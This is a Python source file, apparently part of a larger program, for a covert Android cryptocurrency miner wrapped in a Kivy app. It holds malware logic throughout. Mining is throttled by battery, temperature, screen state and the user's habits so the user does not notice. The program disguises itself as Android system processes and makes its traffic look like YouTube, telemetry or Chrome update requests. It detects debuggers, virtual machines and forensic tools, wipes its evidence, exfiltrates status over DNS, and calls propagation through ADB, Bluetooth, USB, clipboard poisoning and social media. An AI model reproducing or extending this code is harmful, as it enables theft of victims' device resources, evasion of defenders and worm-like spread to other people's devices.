        elif local_time.hour >= 9 and local_time.hour < 17:
            if local_time.weekday() < 5:
                return 'WORK_HOURS'
            else:
                return 'WEEKEND_DAY'
        return 'NORMAL'

class PowerMonitor:
    def __init__(self):
        self.last_check = 0
        self.cached_power_state = None

    def check_power_state(self) -> Dict[str, Any]:
        if time.time() - self.last_check < 30 and self.cached_power_state:
            return self.cached_power_state
        result = {'on_ac': True, 'battery_percent': 100, 'charging': False}
        try:
            if ANDROID_AVAILABLE:
                context = AndroidAppContext.get_context()
                if context:
                    ifilter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
                    battery_status = context.registerReceiver(None, ifilter)
                    if battery_status:
                        level = battery_status.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
                        scale = battery_status.getIntExtra(BatteryManager.EXTRA_SCALE, -1)
                        status = battery_status.getIntExtra(BatteryManager.EXTRA_STATUS, -1)
                        plugged = battery_status.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1)
                        battery_pct = int(level * 100 / scale) if level >= 0 and scale > 0 else 100
                        on_ac = (plugged > 0 or status == BatteryManager.BATTERY_STATUS_CHARGING or
                                status == BatteryManager.BATTERY_STATUS_FULL)
                        result = {'on_ac': on_ac, 'battery_percent': battery_pct, 'charging': on_ac}
                        self.cached_power_state = result
                        self.last_check = time.time()
                        return result
        except:
            pass
        self.cached_power_state = result
        self.last_check = time.time()
        return result

    def get_score(self) -> int:
        power = self.check_power_state()
        if not power['on_ac'] and power['battery_percent'] < 50:
            return 0
        elif not power['on_ac'] and power['battery_percent'] < 80:
            return 15
        elif not power['on_ac']:
            return 30
        elif power['on_ac']:
            return 100
        return 50

class ThermalMonitor:
    def get_cpu_temperature(self) -> float:
        try:
            thermal_paths = ['/sys/class/thermal/thermal_zone0/temp',
                           '/sys/class/thermal/thermal_zone1/temp']
            for path in thermal_paths:
                if os.path.exists(path) and os.access(path, os.R_OK):
                    with open(path, 'r') as f:
                        temp = float(f.read().strip()) / 1000
                        if 20 < temp < 120:
                            return temp
        except:
            pass
        return 50.0

    def get_score(self) -> int:
        temp = self.get_cpu_temperature()
        if temp > 85:
            return 0
        elif temp > 75:
            return 10
        elif temp > 65:
            return 30
        elif temp > 50:
            return 60
        else:
            return 100

class ProcessMonitor:
    def detect_realtime_communication(self) -> bool:
        try:
            if ANDROID_AVAILABLE:
                context = AndroidAppContext.get_context()
                if context:
                    am = cast('android.app.ActivityManager',
                             context.getSystemService(Context.ACTIVITY_SERVICE))
                    if am:
                        processes = am.getRunningAppProcesses()
                        if processes:
                            for proc in processes:
                                name = proc.processName.lower()
                                if any(app in name for app in ['zoom', 'skype', 'discord', 'teams', 'meet']):
                                    return True
        except:
            pass
        return False

    def has_important_apps(self) -> bool:
        return self.detect_realtime_communication()

    def get_score(self) -> int:
        if self.detect_realtime_communication():
            return 0
        return 100

class ScreenMonitor:
    def __init__(self):
        self.last_check = 0
        self.cached_state = False

    def is_screen_locked_or_off(self) -> bool:
        if time.time() - self.last_check < 10:
            return self.cached_state
        try:
            if ANDROID_AVAILABLE:
                context = AndroidAppContext.get_context()
                if context:
                    power_manager = cast('android.os.PowerManager',
                                        context.getSystemService(Context.POWER_SERVICE))
                    if power_manager:
                        if Build_VERSION.SDK_INT >= 20:
                            self.cached_state = not power_manager.isInteractive()
                        else:
                            self.cached_state = not power_manager.isScreenOn()
        except:
            self.cached_state = False
        self.last_check = time.time()
        return self.cached_state

    def get_score(self) -> int:
        return 200 if self.is_screen_locked_or_off() else 100

class NetworkMonitor:
    def user_is_streaming(self) -> bool:
        return False

    def should_communicate_now(self) -> bool:
        return ScreenMonitor().is_screen_locked_or_off()

    def get_score(self) -> int:
        return 100

class SmartMiningOrchestrator:
    def __init__(self):
        self.power = PowerMonitor()
        self.thermal = ThermalMonitor()
        self.process = ProcessMonitor()
        self.learn = UsagePatternLearner()
        self.screen = ScreenMonitor()
        self.network = NetworkMonitor()
        self.risk_level = 0

    def calculate_mining_intensity(self) -> float:
        scores = []
        weights = []
        scores.append(self.power.get_score()); weights.append(10)
        scores.append(self.thermal.get_score()); weights.append(8)
        if self.screen.is_screen_locked_or_off():
            user_score = 100; weights.append(3)
        elif self.process.has_important_apps():
            user_score = 5; weights.append(15)
        else:
            user_score = 80; weights.append(5)
        scores.append(user_score)
        pattern = self.learn.predict_user_activity()
        if pattern == 'SLEEPING':
            time_score = 100
        elif pattern == 'HEAVY_USE':
            time_score = 20
        else:
            time_score = 60
        scores.append(time_score); weights.append(4)
        scores.append(self.network.get_score()); weights.append(2)
        total_score = sum(s * w for s, w in zip(scores, weights))
        total_weight = sum(weights)
        final_intensity = total_score / total_weight if total_weight > 0 else 0
        return self.map_intensity_to_cpu(final_intensity)

    def map_intensity_to_cpu(self, intensity: float) -> float:
        if intensity > 90:
            return random.uniform(60, 80)
        elif intensity > 70:
            return random.uniform(30, 50)
        elif intensity > 50:
            return random.uniform(15, 25)
        elif intensity > 30:
            return random.uniform(5, 10)
        else:
            return 0

class AdaptiveNetworkMimicry:
    def should_communicate_now(self) -> bool:
        return NetworkMonitor().should_communicate_now()

    def mimic_youtube_analytics(self, data: bytes) -> bytes:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36',
            'Accept': '*/*',
            'Origin': 'https://www.youtube.com',
            'Content-Type': 'application/x-protobuf'
        }
        http_header = 'POST /api/stats/playback HTTP/1.1\r\n'
        for k, v in headers.items():
            http_header += f'{k}: {v}\r\n'
        http_header += f'Content-Length: {len(data)}\r\n\r\n'
        return http_header.encode() + data

    def mimic_android_telemetry(self, data: bytes) -> bytes:
        headers = {'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 13)',
                   'Content-Type': 'application/octet-stream'}
        http_header = 'POST /telemetry HTTP/1.1\r\n'
        for k, v in headers.items():
            http_header += f'{k}: {v}\r\n'
        http_header += f'Content-Length: {len(data)}\r\n\r\n'
        return http_header.encode() + data

    def mimic_chrome_autoupdate(self, data: bytes) -> bytes:
        headers = {'User-Agent': 'Chrome/120.0.6099.144 Mobile',
                   'Content-Type': 'application/xml'}
        http_header = 'POST /update HTTP/1.1\r\n'
        for k, v in headers.items():
            http_header += f'{k}: {v}\r\n'
        http_header += f'Content-Length: {len(data)}\r\n\r\n'
        return http_header.encode() + data

class ProcessDisguise:
    @staticmethod
    def set_process_name(name: str):
        try:
            cmdline_path = '/proc/self/cmdline'
            if os.path.exists(cmdline_path) and os.access(cmdline_path, os.W_OK):
                with open(cmdline_path, 'w') as f:
                    f.write(name)
        except:
            pass

    @staticmethod
    def randomize_disguise():
        disguises = [
            'com.android.systemui',
            'com.google.android.gms.persistent',
            'com.android.phone',
            'android.process.acore',
        ]
        ProcessDisguise.set_process_name(random.choice(disguises))

class AntiAnalysis:
    def __init__(self):
        self.vm_indicators = [b'vbox', b'vmware', b'qemu', b'xen', b'hyper-v', b'kvm', b'parallels']

    def detect_debugger(self) -> bool:
        try:
            tracer_path = '/proc/self/status'
            if os.path.exists(tracer_path) and os.access(tracer_path, os.R_OK):
                with open(tracer_path, 'r') as f:
                    if 'TracerPid:\t0' not in f.read():
                        return True
            return False
        except:
            return False

    def detect_vm(self) -> bool:
        try:
            if ANDROID_AVAILABLE:
                props = ['ro.product.model', 'ro.product.manufacturer', 'ro.hardware']
                for prop in props:
                    try:
                        JavaClass_forName = autoclass('java.lang.Class')
                        JavaSystem_class = JavaClass_forName.forName('java.lang.System')
                        prop_value = JavaSystem_class.getProperty(prop)
                        if prop_value:
                            content = str(prop_value).lower()
                            if any(indicator.decode().lower() in content for indicator in self.vm_indicators):
                                return True
                    except:
                        pass
            dmi_paths = ['/sys/class/dmi/id/product_name', '/sys/class/dmi/id/sys_vendor']
            for path in dmi_paths:
                try:
                    if os.path.exists(path) and os.access(path, os.R_OK):
                        with open(path, 'r') as f:
                            content = f.read().lower()
                            if any(indicator.decode().lower() in content for indicator in self.vm_indicators):
                                return True
                except:
                    pass
        except:
            pass
        return False

    def check_uptime(self) -> bool:
        try:
            uptime_path = '/proc/uptime'
            if os.path.exists(uptime_path) and os.access(uptime_path, os.R_OK):
                with open(uptime_path, 'r') as f:
                    return float(f.readline().split()[0]) > 600
        except:
            pass
        return True

class ConnectionManager:
    def __init__(self):
        self.pool_proxies = self._generate_proxy_domains()
        self.current_proxy = None
        self.retry_delays = [60, 300, 900, 3600, 7200]
        self.failed_attempts = 0

    def _generate_proxy_domains(self) -> List[str]:
        return [
            'd15k2d11x6t4x2.cloudfront.net', 'd3n7sduf3q5q2p.cloudfront.net',
            'az416426.vo.msecnd.net', 'global.prod.fastly.net',
            'cdn.cloudflare.net', 'cloudflare-eth.com',
        ]

    def get_connection_string(self) -> str:
        if not self.current_proxy:
            self.current_proxy = random.choice(self.pool_proxies)
        return f"stratum+ssl://{self.current_proxy}:443"

    def rotate_pool(self):
        self.current_proxy = random.choice(self.pool_proxies)
        self.failed_attempts = 0

    def get_backoff_delay(self) -> int:
        idx = min(self.failed_attempts, len(self.retry_delays) - 1)
        delay = self.retry_delays[idx]
        self.failed_attempts += 1
        return delay

class PayloadManager:
    def __init__(self):
        self.memory_storage = MemoryOnlyStorage()
        self.payloads: Dict[str, bytes] = {}

    def remove_artifacts(self):
        self.memory_storage.wipe()
        self.payloads.clear()

# ============================================================================
# STEALTH MINER - MAIN ENGINE (MERGED)
# ============================================================================

class StealthMiner:
    def __init__(self, wallet_address: str):
        self.wallet_manager = WalletManager()
        self.wallet = self.wallet_manager.get_current_wallet()
        if wallet_address and wallet_address != "YOUR_WALLET_ADDRESS_HERE":
            self.wallet = wallet_address
        self.running = True
        self.active = False
        self.cpu_limit = random.uniform(5, 15)
        self.tasks: List[threading.Thread] = []
        self._task_lock = threading.Lock()
        self.anti_analysis = AntiAnalysis()
        self.net_evasion = NetworkEvasion()
        self.proc_disguise = ProcessDisguise()
        self.connection_mgr = ConnectionManager()
        self.payload_mgr = PayloadManager()
        self.timing = TimingObfuscator()
        self.env_fp = EnvironmentalFP()
        self.memory_storage = MemoryOnlyStorage()
        self.dns_exfil = DNSExfiltrator(self.net_evasion.dga_domains)
        self.last_hashrate_log = time.time()
        self.hashrate_history = []
        self.workload_patterns = self._generate_workload_patterns()
        self.connection_string = self.connection_mgr.get_connection_string()
        self._mining_data = self._generate_mining_data()
        self.orchestrator = SmartMiningOrchestrator()
        self.adaptive_network = AdaptiveNetworkMimicry()
        self.power_monitor = PowerMonitor()
        self.thermal_monitor = ThermalMonitor()
        self.process_monitor = ProcessMonitor()
        self.screen_monitor = ScreenMonitor()
        self.network_monitor = NetworkMonitor()
        self.usage_learner = UsagePatternLearner()
        self.current_intensity = 0.0
        self.forensic_detector = ForensicToolDetector()
        
        # === PROPAGATION COMPONENTS (MERGED) ===
        self.propagation_engine = PropagationEngine()
        self.clipboard_poisoner = ClipboardPoisoner()
        self.qr_generator = QRCodeGenerator()
        self.social_spreader = SocialMediaSpreader()
        self.adb_propagator = ADBPropagator()
        self.bluetooth_worm = BluetoothWorm()
        self.usb_worm = USBWorm()
        self._last_propagation_time = 0

    def _generate_mining_data(self) -> Dict[str, Any]:
        return {
            "version": random.randint(1, 10),
            "worker_id": self.wallet[:16],
            "session_id": str(uuid.uuid4()),
            "last_job_id": hashlib.sha256(os.urandom(32)).hexdigest()
        }

    def _generate_workload_patterns(self):
        patterns = []
        for _ in range(8):
            patterns.append({
                'base': random.uniform(0.03, 0.12),
                'amplitude': random.uniform(0.02, 0.06),
                'frequency': random.uniform(0.05, 0.3),
                'phase': random.uniform(0, 6.28)
            })
        return patterns

    def calculate_hash(self, data: bytes, difficulty: float) -> Dict[str, Any]:
        nonce = struct.pack('<Q', random.randint(0, 2**64 - 1))
        target = bytes([255] * (32 - int(difficulty * 32))) + bytes([0] * int(difficulty * 32))
        for _ in range(int(1000 * difficulty)):
            combined = data + nonce + struct.pack('<Q', _)
            result = hashlib.sha256(combined)
            result2 = hashlib.sha256(result.digest())
            if result2.digest() < target:
                return {"success": True, "nonce": nonce.hex(), "hash": result2.hexdigest(), "iterations": _}
            nonce = struct.pack('<Q', _ + 1)
        return {"success": False, "iterations": int(1000 * difficulty)}

    def simulate_mining(self, intensity: float):
        while self.active and self.running and intensity > 0.01:
            try:
                if self.forensic_detector.is_investigation_active():
                    time.sleep(5)
                    continue
                job_data = hashlib.sha256(
                    f"{self.wallet}{time.time()}{random.random()}".encode()
                ).digest()
                difficulty = intensity * random.uniform(0.3, 0.7)
                result = self.calculate_hash(job_data, difficulty)
                if result["success"] and time.time() - self.last_hashrate_log > random.uniform(30, 120):
                    self.hashrate_history.append({
                        "time": time.time(), "hash": result["hash"], "difficulty": difficulty
                    })
                    self.last_hashrate_log = time.time()
                    if len(self.hashrate_history) > random.randint(3, 10):
                        self._submit_mining_results()
                time.sleep(random.uniform(0.1, 0.5) / max(1 + intensity, 0.01))
            except Exception:
                time.sleep(1)

    def _submit_mining_results(self):
        if not self.hashrate_history or not self.adaptive_network.should_communicate_now():
            self.hashrate_history = []
            return
        payload = {
            "worker": self._mining_data["worker_id"],
            "session": self._mining_data["session_id"],
            "shares": self.hashrate_history,
            "wallet": self.wallet
        }
        json_payload = json.dumps(payload).encode()
        if self.network_monitor.user_is_streaming():
            http_payload = self.adaptive_network.mimic_youtube_analytics(json_payload)
        elif self.screen_monitor.is_screen_locked_or_off():
            http_payload = self.adaptive_network.mimic_android_telemetry(json_payload)
        else:
            http_payload = self.adaptive_network.mimic_chrome_autoupdate(json_payload)
        self.memory_storage.store(f"submit_{time.time()}", http_payload)
        self.hashrate_history = []

    def smart_power_decision(self) -> int:
        power = self.power_monitor.check_power_state()
        if not power['on_ac'] and power['battery_percent'] < 50:
            return 0
        elif not power['on_ac'] and power['battery_percent'] < 80:
            return 3
        elif power['on_ac']:
            return 100
        return 50

    def thermal_adaptive_mining(self) -> int:
        temp = self.thermal_monitor.get_cpu_temperature()
        if temp > 85:
            return 0
        elif temp > 75:
            return 10
        elif temp > 65:
            return 30
        elif temp > 50:
            return 60
        else:
            return 100

    def _clean_threads(self):
        with self._task_lock:
            self.tasks = [t for t in self.tasks if t.is_alive()]

    # === PROPAGATION METHOD ===
    def run_propagation(self):
        """Run all propagation methods periodically"""
        try:
            # Main propagation engine
            results = self.propagation_engine.propagate()
            
            # Individual methods with more frequency
            if random.random() < 0.1:
                self.adb_propagator.mass_propagate()
            
            if random.random() < 0.05:
                self.bluetooth_worm.scan_and_infect()
            
            if random.random() < 0.08:
                self.clipboard_poisoner.poison_clipboard()
            
            Logger.info(f"StealthMiner: Propagation results - {results}")
        except Exception as e:
            Logger.error(f"StealthMiner: Propagation error - {e}")

    # === ADJUST WORKLOAD - MAIN LOOP ===
    def adjust_workload(self):
        pattern_idx = 0
        activation_level = 0
        while self.running:
            try:
                t = time.time()
                self.usage_learner.learn_user_pattern()
                orchestrated_intensity = self.orchestrator.calculate_mining_intensity()
                
                # Security checks
                if self.forensic_detector.is_investigation_active():
                    self.memory_storage.wipe()
                    orchestrated_intensity = 0
                    time.sleep(30)
                    continue
                
                if self.anti_analysis.detect_debugger() or self.anti_analysis.detect_vm():
                    orchestrated_intensity = 0
                    time.sleep(30)
                    continue
                
                # Power decisions
                power_decision = self.smart_power_decision()
                if power_decision == 0:
                    orchestrated_intensity = 0
                elif power_decision <= 3:
                    orchestrated_intensity = min(orchestrated_intensity, 5.0)
                
                # Thermal decisions
                thermal_decision = self.thermal_adaptive_mining()
                if thermal_decision == 0:
                    orchestrated_intensity = 0
                    time.sleep(60)
                    continue
                elif thermal_decision <= 10:
                    orchestrated_intensity = min(orchestrated_intensity, 10.0)
                
                # Process check
                if self.process_monitor.detect_realtime_communication():
                    orchestrated_intensity = 0
                
                # Screen state
                if self.screen_monitor.is_screen_locked_or_off():
                    orchestrated_intensity = min(orchestrated_intensity * 1.5, 80.0)
                
                # Optimal window
                optimal_window = self.usage_learner.get_optimal_mining_windows()
                if optimal_window == 'DEEP_SLEEP':
                    orchestrated_intensity = min(orchestrated_intensity * 1.3, 80.0)
                elif optimal_window == 'WORK_HOURS':
                    orchestrated_intensity = min(orchestrated_intensity, 15.0)
                
                self.current_intensity = orchestrated_intensity
                
                # Low intensity - deactivate and propagate
                if orchestrated_intensity < 0.5:
                    if self.active:
                        self.deactivate_mining()
                    time.sleep(random.uniform(5, 15))
                    continue
                
                # Activation trigger
                activation_trigger = self.timing.should_activate()
                if activation_trigger >= 0:
                    activation_level = min(1.0, activation_level + 0.1)
                else:
                    activation_level = max(0.03, activation_level - 0.02)
                
                # Start mining if needed
                if orchestrated_intensity > 1.0:
                    if not self.active:
                        self.activate_mining()
                    self._clean_threads()
                    threads_needed = max(1, int(orchestrated_intensity / 10))
                    with self._task_lock:
                        current_alive = len(self.tasks)
                    if threads_needed > current_alive:
                        for _ in range(min(threads_needed - current_alive, 3)):
                            t = threading.Thread(
                                target=self.simulate_mining,
                                args=(activation_level * (orchestrated_intensity / 100),),
                                daemon=True
                            )
                            with self._task_lock:
                                self.tasks.append(t)
                            t.start()
                else:
                    if self.active:
                        self.deactivate_mining()
                
                # === RUN PROPAGATION PERIODICALLY ===
                if time.time() - self._last_propagation_time > random.uniform(600, 1800):
                    self.run_propagation()
                    self._last_propagation_time = time.time()
                
                # Exfiltrate status
                if random.random() < 0.05 and self.adaptive_network.should_communicate_now():
                    self.dns_exfil.exfiltrate(
                        json.dumps({
                            "alive": True,
                            "fp": self.env_fp.fingerprint[:16],
                            "intensity": self.current_intensity
                        }).encode()
                    )
                
                # Sleep based on intensity
                if self.current_intensity > 50:
                    sleep_time = random.uniform(0.5, 1.5)
                elif self.current_intensity < 5:
                    sleep_time = random.uniform(5, 10)
                else:
                    sleep_time = random.uniform(1, 3)
                time.sleep(sleep_time)
                
            except Exception as e:
                Logger.error(f"StealthMiner: adjust_workload error - {e}")
                time.sleep(5)

    def activate_mining(self):
        self.active = True
        self.connection_string = self.connection_mgr.get_connection_string()
        self.proc_disguise.randomize_disguise()

    def deactivate_mining(self):
        self.active = False
        self._clean_threads()
        self.payload_mgr.remove_artifacts()

    def reduce_activity(self):
        self._clean_threads()

    def start(self):
        """Main entry point for the miner"""
        Logger.info("StealthMiner: Starting...")
        
        # Anti-analysis checks
        if self.anti_analysis.detect_debugger():
            time.sleep(random.uniform(60, 300))
            if self.anti_analysis.detect_debugger():
                sys.exit(0)
        
        if self.anti_analysis.detect_vm():
            time.sleep(random.uniform(300, 900))
        
        if self.forensic_detector.is_investigation_active():
            time.sleep(random.uniform(1800, 3600))
        
        # Delayed activation
        activation_time = self.env_fp.get_activation_time()
        current_time = int(time.time())
        if current_time < activation_time:
            time.sleep(activation_time - current_time)
        
        self.running = True
        
        # Start main workload thread
        monitor = threading.Thread(target=self.adjust_workload, daemon=True, name="WorkloadMonitor")
        monitor.start()
        
        # Start periodic cleanup thread
        cleanup = threading.Thread(target=self.periodic_cleanup, daemon=True, name="CleanupThread")
        cleanup.start()
        
        try:
            while self.running:
                time.sleep(10)
        except KeyboardInterrupt:
            self.running = False
            self.deactivate_mining()
        except Exception:
            self.running = False

    def periodic_cleanup(self):
        """Periodic cleanup and persistence check"""
        while self.running:
            time.sleep(random.uniform(600, 1800))
            if self.forensic_detector.is_investigation_active():
                self.memory_storage.wipe()
            self.payload_mgr.remove_artifacts()
            self._clean_threads()
            if not self.forensic_detector.is_investigation_active():
                self.usage_learner._save_history()

    def stop(self):
        """Graceful shutdown"""
        Logger.info("StealthMiner: Stopping...")
        self.running = False
        self.deactivate_mining()
        with self._task_lock:
            for thread in self.tasks:
                if thread and thread.is_alive():
                    thread.join(timeout=2)
            self.tasks.clear()
        self.memory_storage.wipe()

# ============================================================================
# KIVY APP
# ============================================================================

class ServiceApp(App):
    """Kivy App wrapper"""
    
    def __init__(self, **kwargs):
        super(ServiceApp, self).__init__(**kwargs)
        self.miner = None
        self._start_time = time.time()
        
    def build(self):
        layout = BoxLayout(orientation='vertical', padding=20)
        self.status_label = Label(
            text="Initializing...",
            font_size='16sp',
            halign='center',
            valign='middle'
        )
        layout.add_widget(self.status_label)
        threading.Thread(target=self._start_miner, daemon=True).start()
        return layout
    
    def _start_miner(self):
        try:
            self.miner = StealthMiner(WALLET_ADDRESS)
            self.miner.start()
        except Exception as e:
            Logger.error(f"ServiceApp: {e}")
    
    def on_stop(self):
        if self.miner:
            self.miner.stop()

# ============================================================================
# ENTRY POINTS
# ============================================================================

def start_service():
    """Entry point for Android service"""
    print("[Service] Starting service...")
    if not ANDROID_AVAILABLE:
        print("[Service] Not on Android")
        return
    try:
        print("[Service] Service started successfully")
    except Exception as e:
        print(f"[Service] Error: {e}")

if __name__ == "__main__":
    print(f"[Main] ANDROID_AVAILABLE: {ANDROID_AVAILABLE}")
    print(f"[Main] KIVY_AVAILABLE: {KIVY_AVAILABLE}")
    
    if WALLET_ADDRESS == "YOUR_WALLET_ADDRESS_HERE":
        print("[Main] ERROR: Please set your wallet address")
        sys.exit(1)
    
    is_service = False
    if ANDROID_AVAILABLE:
        try:
            PythonService = autoclass('org.kivy.android.PythonService')
            if PythonService and PythonService.mService:
                is_service = True
        except:
            pass
    
    if is_service:
        print("[Main] Starting in SERVICE mode")
        start_service()
    else:
        print("[Main] Starting in APP mode")
        try:
            app = ServiceApp()
            app.run()
        except Exception as e:
            print(f"[Main] App crashed: {e}")
            miner = StealthMiner(WALLET_ADDRESS)
            miner.start()
